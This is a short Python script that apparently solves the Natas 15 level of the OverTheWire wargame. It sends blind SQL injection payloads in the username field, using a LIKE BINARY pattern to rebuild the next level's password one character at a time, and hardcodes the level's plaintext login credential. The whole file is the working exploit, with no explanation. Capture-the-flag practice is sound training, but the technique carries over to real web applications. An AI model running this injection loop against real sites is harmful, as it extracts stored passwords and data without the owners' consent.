# coding=utf-8
import requests

url = "http://natas15.natas.labs.overthewire.org/index.php"
auth=requests.auth.HTTPBasicAuth('natas15','TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB')
chr = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
flag=""

i=0
while i < len(chr):
    payload = "natas16\" AND password like binary\""+flag+chr[i]+"%\" #"
    req = requests.post(url,auth=auth,data={"username":payload})
    if "This user exists" in req.text:
        flag+=chr[i]
        print(flag)
        i=0
        continue
    i+=1
